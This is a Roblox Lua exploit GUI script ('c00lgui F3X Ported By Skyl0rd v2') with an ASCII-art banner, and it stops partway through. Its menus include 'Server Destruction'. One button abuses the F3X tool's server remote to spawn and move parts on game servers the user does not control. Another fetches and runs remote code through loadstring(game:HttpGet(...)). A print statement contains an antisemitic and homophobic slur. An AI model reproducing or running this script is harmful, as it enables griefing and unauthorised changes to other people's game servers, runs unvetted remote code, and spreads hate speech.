	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⢠⡤⠖⠋⠁⠀⠀⠠⢀⡿⠉⠙⠢⠤⠀⣉⠒⠤⣀⠀⠀⠀⠀⠀⠀⡿⢸⡀⠀⠀⠀⠀⠀⡀⠠⢖⠍⠀⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣤⠃⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠤⠓⠋⠀⠀⠀⡀⠤⠀⠂⣠⠞⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠁⠀⠀⠀⠀⢠⠇⣈⣇⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⢀⠠⠂⠀⡄⠹⡀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠈⢀⠀⠠⠐⡴⢡⠂⠁⠂⠤⣤⣀⠀⠀⠀⠈⠢⠀⠀⠀⠀⠀⡼⠀⣼⢹⡀⠀⠀⠀⠀⢀⡠⠤⠏⠁⠀⠀⠀⠀⠀⣰⠀⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⠀⠀⠀⠀⠀⠀⡀⠁⠀⠂⠀⠄⡜⢀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠉⠂⠲⡄⠤⠀⢠⡼⠁⢀⡟⠀⣧⠐⠒⠒⠽⠋⠁⠀⠀⠀⠀⡠⠤⠎⠁⠁⠀⠸⡀⠀⠀⠀⡀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠄⠀⡀⠁⢀⠂⡸⠀⠀⠈⠒⢤⡀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⢀⡾⠁⣾⣸⠁⠀⡟⡆⠀⠀⡠⠖⠒⠚⠉⠉⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⢀⠝⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠐⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠉⠓⠢⢤⣀⢠⣃⣀⢀⡞⢁⡼⠛⠃⠀⣱⠁⢻⠈⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠒⠀⡇⠀⠀⡠⠋⠈⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢠⣎⣠⡶⠗⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠁⠠⠈⢰⡇⠉⠂⢄⡀⠀⠀⠀⠀⠀⠀⠀⢁⠂⠀⢀⡟⠠⠞⠀⠠⡄⣱⠃⠀⠈⣇⣀⣀⡤⠆⠂⠂⠂⠂⠒⠉⠁⠁⠀⠀⠀⡇⢀⠎⠀⠀⠀⠀⠀⠁⠀⢠⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢚⣷⡾⠁⠀⠀⠀⠀⠀⠀⢀⠀⠀⠁⠠⠈⠀⠄⢸⣇⠀⠀⠀⠀⠁⠂⠠⢀⠀⠀⠀⠎⠀⢀⡞⠀⠠⠀⠂⣽⣻⠃⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⡠⠚⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⣠⢾⣿⠇⠀⠀⠀⠀⠀⠀⢀⠀⠀⠈⠀⠄⠐⠀⠠⢸⠁⠑⠤⢀⣀⠀⠀⠀⠀⠀⠀⠉⠀⢀⡏⠀⠐⠀⣡⢾⡟⠁⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⣀⡤⠔⠋⠉⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⣰⠃⣯⢾⠀⢀⣴⡟⠀⠀⠀⠀⡀⠈⠀⠄⠀⠂⠈⢀⢸⠀⠀⠀⠀⠀⠀⠁⠑⠢⣀⡀⠀⢠⠟⠀⣈⣤⠞⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⢳⠐⠒⠊⠉⠀⠀⠀⠀⠀⠀⠀⢀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⣰⠃⠀⣷⣿⣴⣟⡿⠁⠀⠀⣀⣁⠀⠀⠐⠀⡈⠀⢁⠀⣼⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣎⣠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⢀⣀⣀⡀⠤⠂⠁⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⢠⠃⠀⠀⠉⢁⣼⡿⢶⣞⡿⣿⣿⡏⠀⠈⡀⠐⠀⢈⠀⣼⢹⠦⠀⠁⠂⠤⣀⠀⠀⠀⠀⠀⡾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⣏⠁⠉⠉⠀⠀⠀⠀⠀⠀⠀⣸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⡞⠀⠀⠀⠀⠞⠛⠛⠉⢁⣿⡿⣿⠁⣀⡐⢂⠄⢈⡆⢠⠇⣼⠀⠀⠀⠀⠀⠀⠀⠉⠐⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⣀⡤⠄⠊⠹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣼⡟⠁⢃⣤⣿⣷⠋⠐⣿⠈⠁⠀⠀⠀⠀⠀⠀⠀⡸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡒⠋⠉⠉⠉⠁⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡿⢋⣿⢁⣴⣾⣿⣿⣟⣠⠟⡏⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⢀⡀⠠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⡏⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠘⣯⣼⣿⠟⣿⣿⠟⠁⣸⠁⠒⠠⢀⡀⠀⠠⠈⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⡧⠖⠒⠒⠁⠉⠁⠀⠀⢻⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⣧⠀⣴⡇⠀⢰⠀⠀⠀⢀⠀⡜⠀⠀⠹⡏⢁⣴⠛⠁⠀⢠⠇⠀⠀⠀⠀⠀⠜⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣧⢹⣒⣒⠶⠶⢦⡤⠝⠛⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⢹⠞⢠⡁⠀⢷⠀⠀⢀⠎⠸⠀⠀⠀⢀⣴⠋⠁⠀⠀⢀⠏⠈⠉⠀⠀⢀⣀⠀⠤⠐⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠈⠸⡇⠀⠈⠆⢀⠇⠀⠁⠀⣼⢠⡞⡁⠀⠀⠀⢀⠏⠀⠀⠀⠚⠛⠂⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⣀⠀⠀⢀⣀⣀⣀⣀⠠⠄⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠹⡄⠀⠈⠚⠂⠀⠀⣴⣿⡎⠀⠀⠀⠀⠀⡞⠀⠀⠐⠒⠐⠀⠀⠀⠀⠈⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⡂⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠙⢄⠀⠀⠀⠀⠀⡇⠈⠀⠀⠀⠀⠀⠈⢳⠀⠀⠀⠀⢀⠀⠀⠤⠄⠒⠂⠨⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠙⠢⢤⣀⡀⢳⢀⣀⣠⠤⠤⠤⠤⠬⡇⠒⠈⠉⠀⠀⠀⠀⠀⠀⢀⠀⠘⣆⢀⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣠⠤⠂⠈⠙⠁⡀⠄⢂⠐⡀⠆⠐⣻⠀⠀⢀⡀⠄⠐⠂⠉⢀⣀⣀⣠⣼⣦⣤⣂⠐⠐⡈⠐⢂⠁⠒⠠⢁⠂⠌⢉⠑⢦⠀⣠⠤⠴⠾⢲⠶⠶⠤⠤⢤⣀⣀⠒⠀⠤⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠳⠤⣌⣌⣠⠁⡐⠈⠄⢂⠐⡈⠄⣹⡖⠀⣀⣠⣦⣶⣿⣿⣭⣽⣶⣷⣽⣶⣬⣭⡳⣥⠀⠡⠀⠌⠠⢁⠂⠌⡀⠂⠌⢀⣾⣥⣶⣶⣿⣿⢿⡿⣿⣿⣿⣿⣮⣽⣿⣶⣄⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠌⠐⡀⢂⠐⠠⢈⣷⣿⣿⣿⣟⡿⣽⣻⣿⣟⡷⣯⣟⣿⣿⣟⣿⣿⠇⠠⢁⠈⡐⠠⠈⠄⠠⢁⠂⣼⣿⣯⣷⣻⣿⣽⢯⣟⣷⣿⣟⣾⣽⣻⣟⡿⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⣌⡐⢀⠂⡈⠐⡀⠻⣿⣿⣿⣾⣿⣿⣽⣯⣿⣟⣷⣿⣾⣿⣿⣿⡿⠀⡁⠂⡐⠠⠁⠌⠠⠁⠂⠄⡈⢿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣾⣷⣿⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠑⠒⠃⠐⠤⠀⠙⠛⠿⠿⣿⣿⣿⣿⠿⠿⠟⠛⢋⠉⡀⠄⢂⠐⠠⠐⠠⠁⠌⠠⠁⠌⠠⠐⡀⠈⠉⠛⠛⠟⠻⠟⠟⠻⠛⠛⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠒⠐⠒⠂⠂⠂⠑⠀⠃⠈⠀⠃⠈⠀⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	
							skyl0rd was here OwO
	]]--
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local CoreGui = game:GetService("CoreGui")
		local guiname = "CoolGui"
	
	
		local removeme = CoreGui:FindFirstChild(guiname)
	
		if removeme then
			removeme:Destroy()
		else
			print("its working jewfaggot")
		end
	
	
	
		blak = Color3.new(0,0,0)
		rede = Color3.new(22,22,44)
		tef = "SourceSans"
		whit = Color3.new(255/255,255/255,255/255)
		local cka = Instance.new("ScreenGui", game.CoreGui)
		cka.Name= "CoolGui"
		local frame = Instance.new("Frame")
		frame.Parent = cka
		frame.BackgroundColor3 = blak
		frame.BorderColor3 = rede
		frame.BorderSizePixel = 3
		frame.Name = "Frame"
		frame.Position = UDim2.new(0,3,0.3,0)
		frame.Size = UDim2.new(0,300,0,400)
		local pges = Instance.new("Frame")
		pges.Parent = frame
		pges.BackgroundColor3 = blak
		pges.BorderColor3 = rede
		pges.BorderSizePixel = 3
		pges.Name = "Pages"
		pges.Position = UDim2.new(0,0,0,0)
		pges.Size = UDim2.new(1,0,1,0)
		local cope = Instance.new("TextButton")
		cope.Parent = cka
		cope.Active = true
		cope.AutoButtonColor = true
		cope.BackgroundColor3 = blak
		cope.BorderColor3 = rede
		cope.BorderSizePixel = 3
		cope.Name = "Close/Open"
		cope.Position = UDim2.new(0,3,0.3,380)
		cope.Selectable = true
		cope.Size = UDim2.new(0,300,0,20)
		cope.ZIndex = 3
		cope.Font = "SourceSans"
		cope.FontSize = "Size18"
		cope.Text = "Close"
		cope.TextColor3 = Color3.new(255,255,255)
		cope.TextXAlignment = "Center"
		cope.TextYAlignment = "Center"
		cope.MouseButton1Down:connect(function()
			if cope.Text == "Close" then
				frame.Visible = false
				cope.Text = "Open" else
				frame.Visible = true
				cope.Text = "Close"	
			end	
		end)
		local page1 = Instance.new("Frame")
		page1.Parent = pges	
		page1.BackgroundColor3 = blak
		page1.BorderColor3 = rede
		page1.BorderSizePixel = 3
		page1.Name = "Page1"
		page1.Position = UDim2.new(0,0,0,83)
		page1.Size = UDim2.new(1,0,1,-106)
		page1.ZIndex = 2
		page1.Visible = true
		local page2 = Instance.new("Frame")
		page2.Parent = pges
		page2.BackgroundColor3 = blak
		page2.BorderColor3 = rede
		page2.BorderSizePixel = 3
		page2.Name = "Page2"
		page2.Position = UDim2.new(0,0,0,83)
		page2.Size = UDim2.new(1,0,1,-106)
		page2.ZIndex = 2
		page2.Visible = false
		local page3 = Instance.new("Frame")
		page3.Parent = pges
		page3.BackgroundColor3 = blak
		page3.BorderColor3 = rede
		page3.BorderSizePixel = 3
		page3.Name = "Page3"
		page3.Position = UDim2.new(0,0,0,83)
		page3.Size = UDim2.new(1,0,1,-106)
		page3.ZIndex = 2
		page3.Visible = false
		local page4 = Instance.new("Frame")
		page4.Parent = pges
		page4.BackgroundColor3 = blak
		page4.BorderColor3 = rede
		page4.BorderSizePixel = 3
		page4.Name = "Page4"
		page4.Position = UDim2.new(0,0,0,83)
		page4.Size = UDim2.new(1,0,1,-106)
		page4.ZIndex = 2
		page4.Visible = false
		local page5 = Instance.new("Frame")
		page5.Parent = pges
		page5.BackgroundColor3 = blak
		page5.BorderColor3 = rede
		page5.BorderSizePixel = 3
		page5.Name = "Page5"
		page5.Position = UDim2.new(0,0,0,83)
		page5.Size = UDim2.new(1,0,1,-106)
		page5.ZIndex = 2
		page5.Visible = false
		page = Instance.new("Frame")
		page.Parent = frame
		page.BackgroundColor3 = blak
		page.BorderColor3 = rede
		page.BorderSizePixel = 3
		page.Name = "Settings"
		page.Position = UDim2.new(1,3,0,0)
		page.Size = UDim2.new(1,0,1,0)
		page.ZIndex = 1
		page.Visible = true
		right = Instance.new("TextButton")
		right.Parent = frame	
		right.BackgroundColor3 = blak
		right.BorderColor3 = rede
		right.BorderSizePixel = 3
		right.Name = ">"
		right.Position = UDim2.new(0.5,3,0,40)
		right.Size = UDim2.new(0.5,-3,0,40)
		right.ZIndex = 2
		right.Font = tef
		right.FontSize = "Size48"
		right.Text = ">"
		right.TextColor3 = whit
		addonr = Instance.new("TextButton")
		addonr.Parent = page5	
		addonr.BackgroundColor3 = blak
		addonr.BorderColor3 = rede
		addonr.BorderSizePixel = 3
		addonr.Name = "addonr"
		addonr.Position = UDim2.new(0,153,0,-40)
		addonr.Size = UDim2.new(0.49,0,0.125,0)
		addonr.Font = tef
		addonr.FontSize = "Size48"
		addonr.Text = ">"
		addonr.TextColor3 = whit
		addonr.ZIndex = 3
		left = Instance.new("TextButton")
		left.Parent = frame	
		left.BackgroundColor3 = blak
		left.BorderColor3 = rede
		left.BorderSizePixel = 3
		left.Name = "<"
		left.Position = UDim2.new(0,0,0,40)
		left.Size = UDim2.new(0.5,-3,0,40)
		left.ZIndex = 2
		left.Font = tef
		left.FontSize = "Size48"
		left.Text = "<"
		left.TextColor3 = whit
		addonl = Instance.new("TextButton")
		addonl.Parent = page1	
		addonl.BackgroundColor3 = blak
		addonl.BorderColor3 = rede
		addonl.BorderSizePixel = 3
		addonl.Name = "addonl"
		addonl.Position = UDim2.new(0,0,0,-40)
		addonl.Size = UDim2.new(0.49,0,0.125,0)
		addonl.Font = tef
		addonl.FontSize = "Size48"
		addonl.Text = "<"
		addonl.TextColor3 = whit
		addonl.ZIndex = 3
		local title = Instance.new("TextLabel")
		title.Parent = frame
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Position = UDim2.new(0,0,0,0)
		title.Size = UDim2.new(1,0,0,40)
		title.ZIndex = 2
		title.Font = tef
		title.FontSize = "Size24"
		title.Text = "c00lgui F3X Ported By Skyl0rd v2"
		title.TextColor3 = whit
		--           inside pages        --
		local acg = Instance.new("Frame")
		acg.Parent = page1
		acg.BackgroundColor3 = blak
		acg.BorderColor3 = rede
		acg.BorderSizePixel = 3
		acg.Name = "Admin Commands/Guis"
		acg.Position = UDim2.new(0.5,3,0,0)
		acg.Size = UDim2.new(0.5,-3,1,0)
		acg.ZIndex = 2
		local sd = Instance.new("Frame")
		sd.Parent = page1
		sd.BackgroundColor3 = blak
		sd.BorderColor3 = rede
		sd.BorderSizePixel = 3
		sd.Name = "Server Destruction"
		sd.Position = UDim2.new(0,0,0,0)
		sd.Size = UDim2.new(0.5,-3,1,0)
		sd.ZIndex = 2
		local gt = Instance.new("Frame")
		gt.Parent = page2
		gt.BackgroundColor3 = blak
		gt.BorderColor3 = rede
		gt.BorderSizePixel = 3
		gt.Name = "Gear/Tools"
		gt.Position = UDim2.new(0.5,3,0,0)
		gt.Size = UDim2.new(0.5,-3,1,0)
		gt.ZIndex = 2
		local ws = Instance.new("Frame")
		ws.Parent = page2
		ws.BackgroundColor3 = blak
		ws.BorderColor3 = rede
		ws.BorderSizePixel = 3
		ws.Name = "Weapon Scripts"
		ws.Position = UDim2.new(0,0,0,0)
		ws.Size = UDim2.new(0.5,-3,1,0)
		ws.ZIndex = 2
		local localp = Instance.new("Frame")
		localp.Parent = page3
		localp.BackgroundColor3 = blak
		localp.BorderColor3 = rede
		localp.BorderSizePixel = 3
		localp.Name = "LocalPlayer"
		localp.Position = UDim2.new(0.5,3,0,0)
		localp.Size = UDim2.new(0.5,-3,1,0)
		localp.ZIndex = 2
		local misc = Instance.new("Frame")
		misc.Parent = page3
		misc.BackgroundColor3 = blak
		misc.BorderColor3 = rede
		misc.BorderSizePixel = 3
		misc.Name = "Misc"
		misc.Position = UDim2.new(0,0,0,0)
		misc.Size = UDim2.new(0.5,-3,1,0)
		misc.ZIndex = 2
		pmi = Instance.new("Frame")
		pmi.Parent = page4
		pmi.BackgroundColor3 = blak
		pmi.BorderColor3 = rede
		pmi.BorderSizePixel = 3
		pmi.Name = "Preset Music IDs"
		pmi.Position = UDim2.new(0.5,3,0,0)
		pmi.Size = UDim2.new(0.5,-3,1,0)
		pmi.ZIndex = 2
		local psd = Instance.new("Frame")
		psd.Parent = page4
		psd.BackgroundColor3 = blak
		psd.BorderColor3 = rede
		psd.BorderSizePixel = 3
		psd.Name = "Preset Skybox/Decal IDs"
		psd.Position = UDim2.new(0,0,0,0)
		psd.Size = UDim2.new(0.5,-3,1,0)
		psd.ZIndex = 2
		local edn = Instance.new("Frame")
		edn.Parent = page5
		edn.BackgroundColor3 = blak
		edn.BorderColor3 = rede
		edn.BorderSizePixel = 3
		edn.Name = "End"
		edn.Position = UDim2.new(0.5,3,0,0)
		edn.Size = UDim2.new(0.5,-3,1,0)
		edn.ZIndex = 2
		local pgi = Instance.new("Frame")
		pgi.Parent = page5
		pgi.BackgroundColor3 = blak
		pgi.BorderColor3 = rede
		pgi.BorderSizePixel = 3
		pgi.Name = "Preset Gear IDs"
		pgi.Position = UDim2.new(0,0,0,0)
		pgi.Size = UDim2.new(0.5,-3,1,0)
		pgi.ZIndex = 2
		--      inside pages end        --
		-- Admin Commands/Guis --
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "iOrb"
		button.Position = UDim2.new(0,0,0,33)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "i0rb"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
	
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
			local player = Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:WaitForChild("HumanoidRootPart")
	
			-- หา SyncAPI
			local tool
			for _,v in ipairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then tool = v.Parent end
			end
			for _,v in ipairs(ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then tool = v.Parent end
			end
	
			local remote = tool.SyncAPI.ServerEndpoint
			local function _(args)
				remote:InvokeServer(unpack(args))
			end
	
			-- ฟังก์ชัน F3X
			local function CreatePart(cf,parent) _( {"CreatePart","Ball",cf,parent} ) end
			local function MovePart(part,cf) _( {"SyncMove",{ {Part=part, CFrame=cf} } } ) end
			local function Resize(part,size,cf) _( {"SyncResize",{ {Part=part, Size=size, CFrame=cf} } } ) end
			local function SetAnchor(bool,part) _( {"SyncAnchor",{ {Part=part, Anchored=bool} } } ) end
			local function SetCollision(part,bool) _( {"SyncCollision",{ {Part=part, CanCollide=bool} } } ) end
			local function SetName(part,name) _( {"SetName",{part},name} ) end
			local function Color(part,color) _( {"SyncColor",{ {Part=part, Color=color, UnionColoring=false} } } ) end
	
			-- ฟังก์ชันเพิ่มไฟ SyncAPI
			function AddFire(part, size, color, color2, heat)
				local createArgs = {
					[1] = "CreateDecorations",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire"
						}
					}
				}
	
				local syncArgs = {
					[1] = "SyncDecorate",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire",
							["Size"] = size,
							["Heat"] = heat,
							["Color"] = color,
							["SecondaryColor"] = color2
						}
					}
				}
	
				_(createArgs)
				_(syncArgs)
	
			end
	
			-- สร้างลูกบอลหมุนรอบตัวผู้เล่นแบบวงรี/โค้ง
			local function createOrbitBall()
				local radius = 5
				local verticalAmplitude = 3 -- ความสูงแกว่งขึ้นลง
				local speed = math.rad(90)
				local angle = 0
	
				-- สร้างลูกบอล
				local initialCF = hrp.CFrame * CFrame.new(radius, -0.1, 0)
				CreatePart(initialCF, workspace)
	
				local ball
				repeat task.wait()
					for _,v in ipairs(workspace:GetDescendants()) do
						if v:IsA("BasePart") and (v.Position - initialCF.Position).Magnitude < 0.1 then
							ball = v
							break
						end
					end
				until ball
	
				SetName(ball,"OrbitBall")
				Resize(ball, Vector3.new(0.9,0.9,0.9), initialCF)
				Color(ball, Color3.new(0, 0, 0)) -- สีฟ้าอ่อน
				SetAnchor(true, ball)
				SetCollision(ball, true)
				AddFire(ball, 0.5, Color3.new(0, 0, 0), Color3.new(0, 0, 0), 15)
	
				-- หมุนรอบตัวผู้เล่นแบบลูป + เฉียงขึ้นลง
				RunService.Heartbeat:Connect(function(dt)
					angle = angle + dt * speed
					local x = math.cos(angle) * radius
					local z = math.sin(angle) * radius
					local y = 2 + math.sin(angle*2) * verticalAmplitude -- แกว่งขึ้นลงแบบวงรี
	
					-- หมุนให้ลูกบอลหันตามแนวการเคลื่อนที่    
					local lookDir = Vector3.new(-math.sin(angle), math.cos(angle*2)*0.1, math.cos(angle))    
					local newCF = CFrame.new(hrp.Position + Vector3.new(x,y,z), hrp.Position + Vector3.new(x,y,z) + lookDir)    
					MovePart(ball, newCF)
	
				end)
	
			end
	
			createOrbitBall()
	
	
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Kohls Admin"
		button.Position = UDim2.new(0.5,3,0,33)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Scrub's Admin"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Kax439/Orb/refs/heads/main/Kohls%20Admin"))()
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Nex Pluvia Admin"
		button.Position = UDim2.new(0,0,0,66)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Nex Pluvia Admin"
